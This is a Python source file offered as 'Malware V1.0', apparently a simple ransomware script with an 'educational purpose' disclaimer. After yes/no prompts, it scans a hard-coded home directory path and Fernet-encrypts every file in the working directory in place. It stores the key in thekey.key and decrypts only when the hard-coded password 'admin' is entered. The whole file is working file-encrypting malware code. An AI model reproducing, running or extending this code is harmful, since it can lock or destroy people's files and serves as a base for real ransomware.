#!/usr/bin/env python3
from colorama import Fore
import os
import sys
import time
from certifi import contents
from cryptography.fernet import Fernet

educational = '''
[The author - MiamiHacker] assumes no responsibility or liability for 
any errors or omissions of this script. There is no guarantees of 
completeness, accuracy, usefulness or timeliness.

It's allowed to clone or use parts of the code for your own project but
please keep in mind that is not allowed to use it against other people or
run it on computers that not belongs to you.
Use it on your own system for testing proposal only!!

This is only for educational purpose on a Academic level for basic research
with publication and dissemination to the public. The resource represents an
academic and non-profit organization.
''' 

malwareversion = '''
───────█████████████████████
────████▀─────────────────▀████
──███▀──────Malware V1.0─────▀███
─██▀───────────────────────────▀██
█▀──────────────by───────────────▀█
█─────────────────────────────────█
█───────────MiamiHacker───────────█
█─────────────────────────────────█
█───█████─────────────────█████───█
█──██▓▓▓███─────────────███▓▓▓██──█
█──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█
█──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█
█▄──████▓▓▓▓██───────██▓▓▓▓████──▄█
▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀
──█▄────▀█████▀─────▀█████▀────▄█
─▄██───────────▄█─█▄───────────██▄
─███───────────██─██───────────███
─███───────────────────────────███
──▀██──██▀██──█──█──█──██▀██──██▀
───▀████▀─██──█──█──█──██─▀████▀
────▀██▀──██──█──█──█──██──▀██▀
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
──────────██──█──█──█──██
───────────█▄▄█▄▄█▄▄█▄▄█
'''

warning = '''
    WARNING:
    Don't play around or delete the generated key.
    All the encrypted files will be lost forever.
'''

key = Fernet.generate_key()
files = []

# print(educational)
print(malwareversion)
for key_in_dir in os.listdir():
    if key_in_dir == "thekey.key":
        print("Founded: " + key_in_dir)
        print("Checking the key:")
        time.sleep(2)
        print ("[                    ] 0% ")
        time.sleep(0.2)
        print ("[" + Fore.GREEN + "=====" + Fore.RESET + "               ] 25%")
        time.sleep(0.3)
        print ("[" + Fore.GREEN + "==========" + Fore.RESET + "          ] 50%")
        time.sleep(0.3)
        print ("[" + Fore.GREEN + "===============" + Fore.RESET + "     ] 75%")
        time.sleep(0.4)
        print ("[" + Fore.GREEN + "====================" + Fore.RESET + "] 100%")
        time.sleep(0.1)
        print("Generated Key:", Fore.GREEN, key, Fore.RESET, "\n")
        print(warning)
        for file in os.listdir():
            if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
                continue
            if os.path.isfile(file):
                files.append(file)
        print(Fore.RESET + "Encrypted:" + Fore.RED, files, Fore.RESET)
        with open("thekey.key", "rb") as key:
            secretkey = key.read()

        def decryptQuestion():
            i = 0
            while i < 2:
                answer = input("\nDo you want to decrypt the files? (yes or no)")
                if any(answer.lower() == f for f in ["yes", 'y', '1', 'ye']):
                    print("\nThe following files will be decrypted:")
                    print(Fore.RESET + "Target:" + Fore.YELLOW, files, Fore.RESET)
                    break
                elif any(answer.lower() == f for f in ['no', 'n', '0', '']):
                    print("Program closed.")
                    sys.exit()
                else:
                    i += 1
                    if i < 2:
                        print('Please enter yes or no')
                    else:
                        print("Program closed incorrect input.")
                        sys.exit()
        decryptQuestion()

        secretphrase = "admin"
        user_phrase = input("\nEnter password:\n")
        try:
            if user_phrase == secretphrase:
                for file in files:
                    with open(file, "rb") as thefile:
                        contents = thefile.read()
                    contents_decrypted = Fernet(secretkey).decrypt(contents)
                    with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
                # TODO: Delete thekey.key file + info
                time.sleep(2) 
                print("\nDecrypting Files:")
                print ("[                    ] 0% ")
                time.sleep(0.2)
                print ("[" + Fore.GREEN + "=====" + Fore.RESET + "               ] 25%")
                time.sleep(0.3)
                print ("[" + Fore.GREEN + "==========" + Fore.RESET + "          ] 50%")
                time.sleep(0.3)
                print ("[" + Fore.GREEN + "===============" + Fore.RESET + "     ] 75%")
                time.sleep(0.4)
                print ("[" + Fore.GREEN + "====================" + Fore.RESET + "] 100%")
                time.sleep(0.1)
                print(Fore.GREEN + "\nThe files are decrypted!" + Fore.RESET)
                print(Fore.RESET + "Decrypted:" + Fore.GREEN, files, Fore.RESET)
                os.remove('thekey.key')
                sys.exit()
            else:
                print("Wrong password!")
                sys.exit()
        except:
            sys.exit()

def scanQuestion():
    i = 0
    while i < 2:
        answer = input("Do you want to scan the system? (yes or no)")
        if any(answer.lower() == f for f in ["yes", 'y', '1', 'ye']):
            print("\nThe following files have been found:")
            break
        elif any(answer.lower() == f for f in ['no', 'n', '0', '']):
            print("Program closed.")
            sys.exit()
        else:
            i += 1
            if i < 2:
                print('Please enter yes or no')
            else:
                print("Program closed incorrect input.")
                sys.exit()
scanQuestion()

def listFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + listFiles(fullPath)
        else:
            allFiles.append(fullPath)
    return allFiles      

def scan():
    exclude = 'malware.py'
    # dirName = (r"/home/hunter/Downloads/malware/")
    dirName = (r"/home/hunter/Projects/OpenSource/malware_github/")
    listOfFiles = list()
    cleanupScan = listOfFiles
    for (dirpath, dirnames, filenames) in os.walk(dirName):
            listOfFiles += [os.path.join(dirpath, file) for file in filenames]
    for elem in listOfFiles:
            if os.path.isfile(elem):
                for listOfFiles in os.listdir():
                    if listOfFiles == exclude:
                       new_exclude = ('malware.py')
                       new_set = {x.replace(new_exclude, '') for x in cleanupScan}
                    continue
            print(Fore.WHITE + 'Founded: ' + Fore.GREEN, elem + Fore.RESET)  
    print(Fore.GREEN + exclude + Fore.RESET + " is in path:")
    print(Fore.WHITE + 'Excluded: ' + Fore.YELLOW, new_exclude + Fore.RESET)  
    #print("LOG: cleanupScan: "+ Fore.BLUE, new_set, Fore.RESET)
scan()

files = []
for file in os.listdir():
    if file == "malware.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(Fore.RESET + "\nFounded:" + Fore.YELLOW, files, Fore.RESET)

def infectQuestion():
    i = 0
    while i < 2:
        answer = input("Do you want to infect the founded files? (yes or no)")
        if any(answer.lower() == f for f in ["yes", 'y', '1', 'ye']):
            print("\nGenerating Key:")
            break
        elif any(answer.lower() == f for f in ['no', 'n', '0', '']):
            print("Program closed.")
            sys.exit()
        else:
            i += 1
            if i < 2:
                print('Please enter yes or no')
            else:
                print("Program closed incorrect input.")
                sys.exit()
infectQuestion()

def generateKey():
    print ("[                    ] 0% ")
    time.sleep(0.2)
    print ("[" + Fore.GREEN + "=====" + Fore.RESET + "               ] 25%")
    time.sleep(0.3)
    print ("[" + Fore.GREEN + "==========" + Fore.RESET + "          ] 50%")
    time.sleep(0.3)
    print ("[" + Fore.GREEN + "===============" + Fore.RESET + "     ] 75%")
    time.sleep(0.4)
    print ("[" + Fore.GREEN + "====================" + Fore.RESET + "] 100%")
    time.sleep(0.1)
    print("Generated Key:", Fore.GREEN, key, Fore.RESET, "\n")
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    
    def encryptingFiles():
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
        time.sleep(2) 
        print("Encrypting Files:")
        print ("[                    ] 0% ")
        time.sleep(0.2)
        print ("[" + Fore.RED + "=====" + Fore.RESET + "               ] 25%")
        time.sleep(0.3)
        print ("[" + Fore.RED + "==========" + Fore.RESET + "          ] 50%")
        time.sleep(0.3)
        print ("[" + Fore.RED + "===============" + Fore.RESET + "     ] 75%")
        time.sleep(0.4)
        print ("[" + Fore.RED + "====================" + Fore.RESET + "] 100%")
        time.sleep(0.1)
        print(Fore.RESET + "Encrypted:" + Fore.RED, files, Fore.RESET)
    encryptingFiles()

generateKey()
